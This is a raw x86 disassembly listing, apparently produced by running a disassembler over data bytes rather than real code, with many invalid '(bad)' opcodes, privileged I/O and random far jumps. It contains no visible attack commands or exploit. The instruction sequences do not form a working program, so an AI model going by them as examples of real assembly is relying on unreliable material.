  429584:	sbb    ebp,DWORD PTR ds:0x1847624e
  42958a:	daa    
  42958b:	adc    dl,BYTE PTR [edi+ebx*1-0x52]
  42958f:	pop    ss
  429590:	fsubr  DWORD PTR [edi-0x2e]
  429593:	in     al,0xb4
  429595:	jg     0x4295dc
  429597:	jmp    0xbf25:0xa168999f
  42959e:	ins    BYTE PTR es:[edi],dx
  42959f:	mov    bh,0xa8
  4295a1:	ret    0xcf81
  4295a4:	lods   eax,DWORD PTR ds:[esi]
  4295a5:	mov    bl,0x43
  4295a7:	scas   eax,DWORD PTR es:[edi]
  4295a8:	xor    BYTE PTR [eax-0x2ae648c],al
  4295ae:	out    dx,eax
  4295af:	mov    bl,0x7a
  4295b1:	test   BYTE PTR [eax],0x7c
  4295b4:	xchg   ecx,eax
  4295b5:	mov    edi,0xc85f1eec
  4295ba:	jbe    0x429563
  4295bc:	sar    BYTE PTR [edi+0x64],cl
  4295bf:	add    esp,eax
  4295c1:	scas   al,BYTE PTR es:[edi]
  4295c2:	pop    ds
  4295c3:	rcl    DWORD PTR ds:0x744fb744,1
  4295c9:	fmul   QWORD PTR [esi]
  4295cb:	sbb    eax,0xe225c647
  4295d0:	mov    esp,0xd3117451
  4295d5:	shl    esi,1
  4295d7:	or     BYTE PTR [eax+0x21f0416c],dh
  4295dd:	mov    cl,0x7
  4295df:	aam    0x9b
  4295e1:	in     al,dx
  4295e2:	int3   
  4295e3:	xchg   ebx,eax
  4295e4:	xchg   ebx,eax
  4295e5:	xchg   ebp,eax
  4295e6:	mov    ah,BYTE PTR [ebx+0x76]
  4295e9:	stos   DWORD PTR es:[edi],eax
  4295ea:	jne    0x429602
  4295ec:	push   esp
  4295ed:	(bad)  
  4295ee:	jne    0x4295c8
  4295f0:	jecxz  0x4295fb
  4295f2:	dec    esi
  4295f3:	mov    ch,0x98
  4295f5:	adc    DWORD PTR [ecx],edx
  4295f7:	je     0x42963f
  4295f9:	cli    
  4295fa:	scas   eax,DWORD PTR es:[edi]
  4295fb:	xchg   ecx,eax
  4295fc:	ins    BYTE PTR es:[edi],dx
  4295fd:	jp     0x42962b
  4295ff:	pop    eax
  429600:	cmp    BYTE PTR [ebx],bh
  429602:	(bad)  [edx-0x2c2796c1]
  429608:	xor    ecx,DWORD PTR [edx-0x434a8ced]
  42960e:	push   0x46
  429610:	jge    0x429612
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	mov    edx,0x55ea7394
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	fucom  st(7)
  42968e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42968f:	fs popa 
  429691:	dec    ecx
  429692:	std    
  429693:	fstp   QWORD PTR [ecx]
  429695:	xlat   BYTE PTR ds:[ebx]
  429696:	ror    DWORD PTR [ecx],cl
  429698:	push   0xffffffac
  42969a:	std    
  42969b:	rcl    ebp,1
  42969d:	adc    al,0xb
  42969f:	push   0x84a3ce3d
  4296a4:	and    dh,bl
  4296a6:	pop    eax
  4296a7:	sub    DWORD PTR ds:0xc8f0e1a4,ecx
  4296ad:	sub    eax,0x4bffb483
  4296b2:	xchg   edi,eax
  4296b3:	imul   ebx,DWORD PTR [ebx],0x5d388d30
  4296b9:	stc    
  4296ba:	pop    eax
  4296bb:	push   ss
  4296bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296bd:	bnd jno 0x42971f
  4296c0:	hlt    
  4296c1:	gs add al,0xdc
  4296c4:	xchg   esp,eax
  4296c5:	dec    edx
  4296c6:	mov    eax,ds:0xb4a019c1
  4296cb:	adc    ah,BYTE PTR [edx]
  4296cd:	push   esp
  4296ce:	xlat   BYTE PTR ds:[ebx]
  4296cf:	sbb    eax,0xcf666877
  4296d4:	adc    DWORD PTR ds:0x8f7fef78,eax
  4296da:	stos   BYTE PTR es:[edi],al
  4296db:	addr16 adc bh,ch
  4296de:	lods   al,BYTE PTR ds:[esi]
  4296df:	sbb    BYTE PTR [ebx],dl
  4296e1:	push   0xffffff8b
  4296e3:	xchg   ebp,eax
  4296e4:	sti    
  4296e5:	sbb    eax,0xa12d0698
  4296ea:	in     al,0x7a
  4296ec:	je     0x42972c
  4296ee:	cmp    DWORD PTR [ebx+0x3e],ecx
  4296f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296f2:	lds    esi,FWORD PTR [ecx-0x79e71bc0]
  4296f8:	or     ebp,0xffffffae
  4296fb:	enter  0x188d,0xaa
  4296ff:	pop    ebx
  429700:	mov    DWORD PTR [edi+eiz*2+0x83b6d26],eax
  429707:	push   0x0
  429709:	or     al,0x8f
  42970b:	out    dx,eax
  42970c:	jp     0x4296d3
  42970e:	jbe    0x429768
  429710:	pop    ebp
  429711:	sar    DWORD PTR [edi+0x41],cl
  429714:	mov    cs,WORD PTR [edi+0x64]
  429717:	push   ds
  429718:	es iret 
  42971a:	pop    ss
  42971b:	imul   edx,DWORD PTR [esi-0x21],0xffffff82
  42971f:	cli    
  429720:	iret   
  429721:	outs   dx,BYTE PTR ds:[esi]
  429722:	push   0x15
  429724:	mov    WORD PTR [esp+esi*1],?
  429727:	aad    0xa5
  429729:	or     al,0x2b
  42972b:	enter  0x87da,0x11
  42972f:	jno    0x4296c2
  429731:	xchg   ecx,eax
  429732:	add    dh,BYTE PTR [edx-0x367ed142]
  429738:	sub    esi,eax
  42973a:	xlat   BYTE PTR ds:[ebx]
  42973b:	add    al,0x2b
  42973d:	mov    DWORD PTR [ecx+0x63db97b1],edi
  429743:	fcom   QWORD PTR [esi]
  429745:	les    ebx,FWORD PTR [ebx]
  429747:	addr16 xchg esi,eax
  429749:	dec    esp
  42974a:	lods   eax,DWORD PTR ds:[esi]
  42974b:	(bad)  
  42974c:	sub    ah,dh
  42974e:	lds    ebx,FWORD PTR [ebp-0x5dd5f180]
  429754:	retf   0xf512
  429757:	push   0x97139104
  42975c:	pop    esi
  42975d:	mov    DWORD PTR [ebx-0x7],edi
  429760:	sub    al,BYTE PTR [ebx+0x50a1146f]
  429766:	neg    DWORD PTR [ebp+0x4bed9794]
  42976c:	out    0x4,al
  42976e:	push   esp
  42976f:	fadd   DWORD PTR [ebx-0x25]
  429772:	mov    dh,0xde
  429774:	and    DWORD PTR [eax],eax
  429776:	dec    edi
  429777:	jmp    0x227de61f
  42977c:	pop    eax
  42977d:	les    esi,FWORD PTR [ebx+0x17]
  429780:	ret    
  429781:	pop    esp
  429782:	jle    0x4297fc
  429784:	pop    esi
  429785:	shl    DWORD PTR [ecx-0x249d03bc],1
  42978b:	(bad)  
  42978c:	sahf   
  42978d:	xor    ecx,DWORD PTR [edx]
  42978f:	retf   
  429790:	jmp    0x429792
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	sub    dh,0x3f
  429803:	rcr    DWORD PTR [edx-0x44],0x1
  429807:	add    BYTE PTR ds:0x8b000001,al
  42980d:	xchg   ebx,eax
  42980e:	jne    0x4297d0
  429810:	jmp    0x706d:0xd0d4a8b4
  429817:	adc    BYTE PTR [eax+0x1907ce02],ah
  42981d:	in     eax,0x48
  42981f:	fmul   QWORD PTR [edx-0x14e0be91]
  429825:	int    0xc8
  429827:	pushf  
  429828:	ret    0xae1a
  42982b:	(bad)  
  42982c:	or     eax,0x481ca7e9
  429831:	push   ecx
  429832:	out    dx,al
  429833:	pop    ds
  429834:	jmp    FWORD PTR [ebx]
  429836:	mov    edx,0xfb81cc16
  42983b:	and    DWORD PTR [ebp+0x7707ac4c],ebp
  429841:	or     edi,edi
  429843:	test   eax,0x95c15717
  429848:	call   0x894053
  42984d:	sbb    DWORD PTR [edi-0x13],edi
  429850:	and    BYTE PTR [ebx-0x31],0x55
  429854:	jnp    0x4297ec
  429856:	sahf   
  429857:	repnz retf 0x33cc
  42985b:	std    
  42985c:	jmp    0x429803
  42985e:	leave  
  42985f:	out    0x70,al
  429861:	push   eax
  429862:	in     al,0x9a
  429864:	daa    
  429865:	js     0x42982a
  429867:	push   ebp
  429868:	fcom   DWORD PTR [edi+0x30]
  42986b:	sbb    edx,DWORD PTR [esi]
  42986d:	outs   dx,BYTE PTR ds:[esi]
  42986e:	je     0x4297f5
  429870:	jg     0x4297f2
  429872:	addr16 ret 
  429874:	dec    ecx
  429875:	or     edx,ebp
  429877:	(bad)  
  429878:	mov    eax,ds:0x83470048
  42987d:	cld    
  42987e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42987f:	mov    dh,BYTE PTR [edx-0x78db2f14]
  429885:	sti    
  429886:	cmp    DWORD PTR [ebp+0x63],edi
  429889:	cmp    BYTE PTR [eax],ch
  42988b:	adc    eax,0xff22dc01
  429890:	bound  edx,QWORD PTR [ecx]
  429892:	mov    eax,ds:0x2078aca3
  429897:	and    al,0x34
  429899:	scas   al,BYTE PTR es:[edi]
  42989a:	or     edi,DWORD PTR [eax]
  42989c:	mov    WORD PTR [eax+0x33330ff3],?
  4298a2:	dec    edi
  4298a3:	sbb    eax,0xf836bed6
  4298a8:	adc    ah,bl
  4298aa:	mov    ecx,0xddf6c417
  4298af:	mov    ah,0xb7
  4298b1:	cmc    
  4298b2:	out    0xe2,al
  4298b4:	ss lahf 
  4298b6:	pop    ds
  4298b7:	push   ecx
  4298b8:	mov    edx,0xbededabb
  4298bd:	cmp    DWORD PTR [ecx-0x25],ebx
  4298c0:	retf   
  4298c1:	pop    ebp
  4298c2:	mov    bh,0x95
  4298c4:	mov    eax,ds:0x9e64586f
  4298c9:	xor    ebx,DWORD PTR [ecx-0x53]
  4298cc:	ja     0x4298da
  4298ce:	in     al,dx
  4298cf:	mov    al,0xf4
  4298d1:	mov    ds:0x9498a253,al
  4298d6:	cmp    eax,0xb5809f3f
  4298db:	pop    ecx
  4298dc:	mov    esi,0xe8f6efca
  4298e1:	imul   esp
  4298e3:	ss ja  0x42992a
  4298e6:	sbb    al,0xdd
  4298e8:	fisubr DWORD PTR [edx+0x4e04df24]
  4298ee:	pop    ebx
  4298ef:	ds ja  0x429880
  4298f2:	and    al,0xac
  4298f4:	jne    0x429950
  4298f6:	mov    al,0x79
  4298f8:	data16 cs mov dl,0xce
  4298fc:	clc    
  4298fd:	sub    BYTE PTR fs:[ecx+0x455b50b2],bh
  429904:	in     al,dx
  429905:	xchg   esi,eax
  429906:	sahf   
  429907:	ret    
  429908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429909:	jbe    0x4298a4
  42990b:	stos   BYTE PTR es:[edi],al
  42990c:	repz jle 0x4298f3
  42990f:	push   ds
  429910:	pop    DWORD PTR [eax]
	...
  429972:	add    BYTE PTR [eax],al
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	mov    ebx,0x5f42317c
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	jp     0x429935
  42998e:	sub    ebp,DWORD PTR [eax+0x5d]
  429991:	fist   WORD PTR [ebx]
  429993:	sbb    ah,BYTE PTR ds:0x6221ec12
  429999:	rcr    BYTE PTR [edx],cl
  42999b:	dec    edi
  42999c:	adc    BYTE PTR [eax],bl
  42999e:	shr    ch,0x66
  4299a1:	mov    cl,0x98
  4299a3:	mov    ds:0x4821f687,al
  4299a8:	into   
  4299a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299aa:	fisttp WORD PTR [esi+eax*2-0x44]
  4299ae:	xor    al,0x21
  4299b0:	fisub  WORD PTR [edi-0x4c39cd1a]
  4299b6:	xchg   BYTE PTR [edx-0x51fc75ba],ch
  4299bc:	in     eax,0x45
  4299be:	ficom  DWORD PTR [esp+eax*8-0x47ed185f]
  4299c5:	add    eax,0x66382e05
  4299ca:	pop    esp
  4299cb:	xchg   ebx,eax
  4299cc:	pop    edi
  4299cd:	push   0xffffffb6
  4299cf:	or     al,0xd
  4299d1:	repnz or ebx,0xe9c533f6
  4299d8:	call   0x8c9:0x5fe009f7
  4299df:	pop    ecx
  4299e0:	pushf  
  4299e1:	(bad)  
  4299e3:	shl    BYTE PTR [ecx-0x919be47],cl
  4299e9:	ret    0x4349
  4299ec:	sbb    BYTE PTR ds:0xab790af1,dh
  4299f2:	sub    BYTE PTR [esi],ch
  4299f4:	test   al,0x21
  4299f6:	push   ebx
  4299f7:	jno    0x4299ab
  4299f9:	sbb    bl,dl
  4299fb:	pop    edx
  4299fc:	popf   
  4299fd:	sbb    BYTE PTR [ebx],bh
  4299ff:	mov    dl,0x22
  429a01:	push   esi
  429a02:	repz icebp 
  429a04:	mov    edx,0x54f35a26
  429a09:	jns    0x4299f1
  429a0b:	outs   dx,DWORD PTR ds:[esi]
  429a0c:	mov    ds:0x8e92496e,al
  429a11:	dec    BYTE PTR [esi-0x39]
  429a14:	sub    DWORD PTR ds:0x4b06d3e8,ebx
  429a1a:	shr    al,0x26
  429a1d:	int3   
  429a1e:	pop    ebp
  429a1f:	sub    eax,DWORD PTR [ecx-0x3]
  429a22:	pop    eax
  429a23:	cwde   
  429a24:	and    dl,ah
  429a26:	xchg   BYTE PTR [ecx+0x5c],al
  429a29:	or     eax,0x3b8b9087
  429a2e:	inc    edi
  429a2f:	xlat   BYTE PTR ds:[ebx]
  429a30:	call   0x4782:0xd8766ce7
  429a37:	ficom  DWORD PTR [edx]
  429a39:	sub    al,0x21
  429a3b:	fcom   DWORD PTR [eax+ebx*1]
  429a3e:	add    ch,BYTE PTR [ebx]
  429a40:	jno    0x4299d9
  429a42:	stos   DWORD PTR es:[edi],eax
  429a43:	fsubrp st(2),st
  429a45:	adc    al,0xb9
  429a47:	ficom  DWORD PTR [ebx+0x5e]
  429a4a:	dec    eax
  429a4b:	mov    DWORD PTR [ebx+0xe],esp
  429a4e:	xchg   esi,eax
  429a4f:	pop    ebp
  429a50:	inc    esp
  429a51:	mov    cl,BYTE PTR [ecx+0x3942e41]
  429a57:	pop    ds
  429a58:	out    0x70,eax
  429a5a:	lods   eax,DWORD PTR ds:[esi]
  429a5b:	loop   0x429a14
  429a5d:	mov    ah,0x87
  429a5f:	out    0x4c,al
  429a61:	dec    edx
  429a62:	scas   al,BYTE PTR es:[edi]
  429a63:	out    dx,al
  429a64:	dec    esi
  429a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a66:	mov    ds:0xc9164dc4,al
  429a6b:	div    DWORD PTR gs:[ecx-0xb]
  429a6f:	es xchg ebx,eax
  429a71:	adc    al,0x2f
  429a74:	adc    al,0x1f
  429a76:	(bad)  ds:0xcbcc98dd
  429a7c:	ret    0x97ba
  429a7f:	shl    BYTE PTR [esi-0x66],cl
  429a82:	mov    ebx,0xaeec60f0
  429a87:	loopne 0x429a12
  429a89:	or     ebp,0x4a
  429a8c:	loope  0x429a3d
  429a8e:	aas    
  429a8f:	xchg   esi,eax
  429a90:	leave  
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x9ca95667
  429b01:	lahf   
  429b02:	adc    eax,0x1be644c
  429b07:	add    BYTE PTR ds:0xfb000001,al
  429b0d:	scas   al,BYTE PTR es:[edi]
  429b0e:	sbb    DWORD PTR [edi-0x3794e302],0xaa7a083f
  429b18:	xlat   BYTE PTR ds:[ebx]
  429b19:	adc    dh,BYTE PTR [esi+0x40cfa82c]
  429b1f:	sub    bh,ch
  429b21:	lds    ebx,FWORD PTR [edx]
  429b23:	cmp    al,0xc8
  429b25:	data16 mov al,ds:0x65fa3589
  429b2b:	adc    ch,0xc6
  429b2e:	dec    ebx
  429b2f:	popa   
  429b30:	lds    esp,FWORD PTR [ebx]
  429b32:	mov    cl,0x39
  429b34:	loopne 0x429b7b
  429b36:	inc    edx
  429b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b38:	dec    ebx
  429b39:	cli    
  429b3a:	rcr    DWORD PTR [edi+0xd7925bb],0xd5
  429b41:	mov    ah,0x36
  429b43:	dec    edi
  429b44:	out    0x2d,al
  429b46:	pop    esp
  429b47:	outs   dx,BYTE PTR ds:[esi]
  429b48:	mov    dl,0xb9
  429b4a:	cmp    edi,DWORD PTR [edi+0x1278c281]
  429b50:	cmp    BYTE PTR [ebx],0x4e
  429b53:	inc    esi
  429b54:	adc    BYTE PTR [eax],bh
  429b56:	(bad)  
  429b57:	outs   dx,DWORD PTR ds:[esi]
  429b58:	push   ebx
  429b59:	shl    BYTE PTR [bp+si+0x41],cl
  429b5d:	loop   0x429b1d
  429b5f:	enter  0x4b4e,0x12
  429b63:	mov    al,0xf0
  429b65:	je     0x429b02
  429b67:	inc    ebx
  429b68:	scas   al,BYTE PTR es:[edi]
  429b69:	mov    ch,0x59
  429b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b6c:	sub    al,BYTE PTR [ecx+edx*1+0x9273821]
  429b73:	pop    edx
  429b74:	or     eax,0xf33213d3
  429b79:	test   al,0xc8
  429b7b:	mov    al,ds:0x8ac09899
  429b80:	aad    0x8e
  429b82:	popf   
  429b83:	aad    0x5a
  429b85:	bound  ebx,QWORD PTR [ebp-0x10bd63e]
  429b8b:	aaa    
  429b8c:	and    al,0xf5
  429b8e:	mov    ecx,0xd604311e
  429b93:	adc    DWORD PTR [edx],ebp
  429b95:	xor    al,0x16
  429b97:	jle    0x429bc4
  429b99:	sub    al,0xb1
  429b9b:	jnp    0x429bdb
  429b9d:	outs   dx,DWORD PTR ds:[esi]
  429b9e:	jns    0x429bc7
  429ba0:	cmp    eax,0xffffffd6
  429ba3:	xor    ebx,esp
  429ba5:	std    
  429ba6:	inc    ebx
  429ba7:	dec    esp
  429ba8:	call   0x7eee3433
  429bad:	cmp    DWORD PTR [ebx],ecx
  429baf:	adc    DWORD PTR [eax],esi
  429bb1:	imul   edi,DWORD PTR [ecx-0x7f],0x61
  429bb5:	imul   esp,edi,0xffffffa4
  429bb8:	pop    ebp
  429bb9:	push   cs
  429bba:	push   es
  429bbb:	fidiv  DWORD PTR [esi]
  429bbd:	(bad)  
  429bbe:	sbb    DWORD PTR [edi+ebx*2+0x15],eax
  429bc2:	js     0x429bc1
  429bc4:	mov    ds:0x19c15e18,eax
  429bc9:	xchg   edx,eax
  429bca:	retf   0xc13b
  429bcd:	pusha  
  429bce:	jmp    0xd560:0xa7e38dd7
  429bd5:	pop    esi
  429bd6:	or     al,0x39
  429bd8:	mov    bl,0xd7
  429bda:	push   ecx
  429bdb:	mov    eax,0xb05fd0d7
  429be0:	rcl    esi,1
  429be2:	sti    
  429be3:	jl     0x429c19
  429be5:	mov    bh,0x80
  429be7:	(bad)  
  429be8:	leave  
  429be9:	loop   0x429bf5
  429beb:	test   dh,cl
  429bed:	push   0x3b103e02
  429bf2:	jecxz  0x429b95
  429bf4:	lds    ebp,FWORD PTR [esi+0x1bfc48c3]
  429bfa:	add    al,dh
  429bfc:	loop   0x429c28
  429bfe:	dec    edi
  429bff:	std    
  429c00:	in     al,0x62
  429c02:	ret    0xcd4e
  429c05:	or     BYTE PTR [eax],ch
  429c07:	out    dx,eax
  429c08:	outs   dx,DWORD PTR ds:[esi]
  429c09:	mov    edx,0x5e1cdfef
  429c0e:	jmp    FWORD PTR [esi]
  429c10:	call   0x0:0x0
	...
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ecx],dh
  429c81:	mov    esp,0xbf69ab1e
  429c86:	add    DWORD PTR [eax],eax
  429c88:	add    eax,0x12000001
  429c8d:	cmp    dh,bh
  429c8f:	cwde   
  429c90:	mov    cl,0xd0
  429c92:	pop    ss
  429c93:	sti    
  429c94:	xchg   ebx,eax
  429c95:	push   ds
  429c96:	mov    edi,0xe4fe6e18
  429c9b:	lock bound edx,QWORD PTR [esi]
  429c9e:	pop    es
  429c9f:	pop    edi
  429ca0:	xor    cl,al
  429ca2:	retf   0xb930
  429ca5:	(bad)
  429ca8:	in     eax,dx
  429ca9:	aas    
  429caa:	popa   
  429cab:	sbb    al,0xa0
  429cad:	jl     0x429c8c
  429caf:	inc    ebp
  429cb0:	inc    edi
  429cb1:	es inc ebp
  429cb3:	push   eax
  429cb4:	pop    eax
  429cb5:	into   
  429cb6:	mov    dh,0xd1
  429cb8:	dec    eax
  429cb9:	push   esi
  429cba:	mov    ds:0xb4e35743,eax
  429cbf:	test   DWORD PTR [ecx],esp
  429cc1:	xchg   ecx,esi
  429cc3:	pop    edx
  429cc4:	dec    ebx
  429cc5:	and    esi,DWORD PTR [edi]
  429cc7:	sbb    cl,BYTE PTR [ebx]
  429cc9:	dec    ecx
  429cca:	mov    ah,bh
  429ccc:	dec    esp
  429ccd:	cmp    DWORD PTR [ebp+0x4],0xffffffb0
  429cd1:	ja     0x429d4f
  429cd3:	in     eax,0xf0
  429cd5:	adc    DWORD PTR [ecx+0x4496d87f],ebp
  429cdb:	sbb    al,bh
  429cdd:	push   ebx
  429cde:	test   bl,0xc
  429ce1:	jp     0x429d48
  429ce3:	icebp  
  429ce4:	inc    ebp
  429ce5:	mov    al,ds:0x42a87850
  429cea:	jo     0x429cd8
  429cec:	add    eax,0x87b9f419
  429cf2:	cld    
  429cf3:	dec    ebx
  429cf4:	push   eax
  429cf5:	imul   esp,ecx,0x3d
  429cf8:	call   0x2a75:0xdd1ba35f
  429cff:	fwait
  429d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d01:	xor    al,0xdb
  429d03:	mov    ebx,0x9d8e7003
  429d08:	je     0x429cf6
  429d0a:	cmc    
  429d0b:	fdiv   QWORD PTR [esi+0x34214e52]
  429d11:	es out dx,eax
  429d13:	jge    0x429d6f
  429d15:	add    BYTE PTR [ebp+0x5b4f381a],ah
  429d1b:	jg     0x429ce0
  429d1d:	fs arpl cx,cx
  429d20:	cwde   
  429d21:	xchg   edi,eax
  429d22:	fcomip st,st(7)
  429d24:	or     bl,BYTE PTR [edi]
  429d26:	jbe    0x429d51
  429d28:	nop
  429d29:	sbb    edi,DWORD PTR [edi+0x77d9c0cd]
  429d2f:	aam    0x4b
  429d31:	mov    bh,0x8e
  429d33:	mov    DWORD PTR [edi+ecx*8+0x70430932],edx
  429d3a:	dec    edi
  429d3b:	dec    esp
  429d3c:	loop   0x429d4e
  429d3e:	ss xchg ecx,eax
  429d40:	xor    al,0x7a
  429d42:	repnz sahf 
  429d44:	pop    ebx
  429d45:	or     DWORD PTR [edx-0x11d8f096],esp
  429d4b:	ja     0x429d1a
  429d4d:	test   DWORD PTR [esi+0x6f5b3870],0x3ed737fe
  429d57:	add    cl,bh
  429d59:	out    dx,eax
  429d5a:	jb     0x429d32
  429d5c:	jbe    0x429d07
  429d5e:	bound  ecx,QWORD PTR [eax+eiz*8]
  429d61:	retf   0xe50a
  429d64:	mov    ecx,0x484149b8
  429d69:	loop   0x429dd2
  429d6b:	or     BYTE PTR [edx],cl
  429d6d:	(bad)  
  429d6f:	dec    edx
  429d70:	pop    es
  429d71:	bound  esi,QWORD PTR [ebx]
  429d73:	lods   al,BYTE PTR ds:[esi]
  429d74:	pop    ds
  429d75:	mov    ah,0x3
  429d77:	pop    esp
  429d78:	cli    
  429d79:	xchg   edi,eax
  429d7a:	int3   
  429d7b:	loopne 0x429d1a
  429d7d:	sar    BYTE PTR [esi],cl
  429d7f:	hlt    
  429d80:	adc    edi,DWORD PTR [esi]
  429d82:	fmul   QWORD PTR [edx+edi*4-0x178ca297]
  429d89:	mov    eax,ds:0xa8d1b0dd
  429d8e:	xlat   BYTE PTR ds:[ebx]
  429d8f:	popa   
  429d90:	fadd   QWORD PTR [eax]
	...
  429df2:	add    BYTE PTR [eax],al
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	fsub   st(7),st
  429e02:	data16 jb 0x429e73
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x91000001
  429e0d:	sub    DWORD PTR ds:[edx-0x2d529b43],ecx
  429e14:	mov    al,0x50
  429e16:	icebp  
  429e17:	loop   0x429e0b
  429e19:	inc    edi
  429e1a:	inc    eax
  429e1b:	popf   
  429e1c:	test   eax,0xa228882c
  429e21:	or     BYTE PTR [eax+0x70638d43],al
  429e27:	outs   dx,DWORD PTR ds:[esi]
  429e28:	dec    ecx
  429e29:	test   al,0x1e
  429e2b:	ins    BYTE PTR es:[edi],dx
  429e2c:	or     esp,ecx
  429e2e:	(bad)  
  429e2f:	jecxz  0x429e6b
  429e31:	jb     0x429df7
  429e33:	xchg   esi,eax
  429e34:	mov    esp,0xbf109a2b
  429e39:	mov    ah,0x16
  429e3b:	cmp    BYTE PTR [esp+ecx*8-0x45bb7a85],bh
  429e42:	cli    
  429e43:	call   0xa6cd34c7
  429e48:	icebp  
  429e49:	rcr    ebx,1
  429e4b:	aad    0xff
  429e4d:	dec    ebx
  429e4e:	and    eax,DWORD PTR [ebp-0x49]
  429e51:	adc    dl,BYTE PTR [edi]
  429e53:	aad    0x71
  429e55:	les    eax,FWORD PTR [edx+edx*8]
  429e58:	mov    edi,0xa9649a0
  429e5d:	push   0x22c0f81b
  429e62:	cs jle 0x429ee3
  429e65:	les    esp,FWORD PTR [ebp+ebx*8+0x5706cc9a]
  429e6c:	push   esp
  429e6d:	arpl   si,di
  429e6f:	popf   
  429e70:	inc    ecx
  429e71:	out    0xd4,al
  429e73:	aaa    
  429e74:	int    0x5c
  429e76:	bswap  esi
  429e78:	jae    0x429e92
  429e7a:	aaa    
  429e7b:	or     ch,BYTE PTR [esi-0xf16d62d]
  429e81:	aas    
  429e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e83:	into   
  429e84:	lahf   
  429e85:	outs   dx,DWORD PTR ds:[esi]
  429e86:	test   eax,0x2b08c047
  429e8b:	jb     0x429e2b
  429e8d:	imul   edx,edi,0x22
  429e90:	test   BYTE PTR [eax+0x12],bl
  429e93:	xchg   ebx,eax
  429e94:	mov    eax,ds:0x81be23ff
  429e99:	sub    BYTE PTR [ebp+0x547c0b34],dh
  429e9f:	xchg   esi,eax
  429ea0:	(bad)  
  429ea1:	fcmove st,st(0)
  429ea3:	or     BYTE PTR [ecx],ah
  429ea5:	fbstp  TBYTE PTR [eax+0x6bd53a6a]
  429eab:	outs   dx,BYTE PTR ds:[esi]
  429eac:	ret    0xec3c
  429eaf:	test   ch,bl
  429eb1:	mov    ah,0xd9
  429eb3:	adc    cl,BYTE PTR [esi-0xe17ba27]
  429eb9:	or     al,0x73
  429ebb:	xchg   BYTE PTR [edi],al
  429ebd:	push   0xdb734db2
  429ec2:	(bad)  
  429ec4:	add    ebp,esi
  429ec6:	mov    WORD PTR [edx+eiz*8],gs
  429ec9:	jnp    0x429ed8
  429ecb:	nop
  429ecc:	shr    BYTE PTR [edx+esi*8],cl
  429ecf:	mov    ebx,0x32ff6194
  429ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ed5:	hlt    
  429ed6:	cmp    bh,ah
  429ed8:	and    DWORD PTR [esi],ecx
  429eda:	and    BYTE PTR [ecx+eiz*8-0x62c56ba6],al
  429ee1:	mov    eax,ds:0x521bf303
  429ee6:	outs   dx,DWORD PTR ds:[esi]
  429ee7:	loop   0x429ee7
  429ee9:	push   esi
  429eea:	(bad)  
  429eeb:	enter  0xc674,0xbc
  429eef:	adc    al,0x84
  429ef1:	stos   BYTE PTR es:[edi],al
  429ef2:	xor    esp,DWORD PTR [esi]
  429ef4:	mov    esi,0x537f15be
  429ef9:	int    0x8b
  429efb:	xchg   ebx,eax
  429efc:	jmp    0x4889331
  429f01:	aad    0xa3
  429f03:	scas   eax,DWORD PTR es:[edi]
  429f04:	adc    al,0x11
  429f06:	xchg   ecx,eax
  429f07:	jns    0x429ef7
  429f09:	mov    bh,0xc3
  429f0b:	mov    al,0x3e
  429f0d:	fs ins BYTE PTR es:[edi],dx
  429f0f:	jecxz  0x429f0a
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x7d8de699]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x7f000001
  429f8d:	test   al,0x25
  429f8f:	push   ebx
  429f90:	in     al,dx
  429f91:	(bad)  
  429f93:	push   0x4f997cde
  429f98:	mov    ds:0x18ffdf8a,eax
  429f9d:	ficomp DWORD PTR [ebp-0x32]
  429fa0:	add    BYTE PTR [eax],dl
  429fa2:	mov    eax,0xe8da0df4
  429fa7:	pop    ds
  429fa8:	xlat   BYTE PTR ds:[ebx]
  429fa9:	push   ds
  429faa:	stos   DWORD PTR es:[edi],eax
  429fab:	sbb    edi,0xffffffdf
  429fae:	push   ebp
  429faf:	pop    edi
  429fb0:	cmp    ebp,ebp
  429fb2:	xchg   edx,eax
  429fb3:	sbb    al,0xf0
  429fb5:	pushf  
  429fb6:	lea    edx,[edi-0x30]
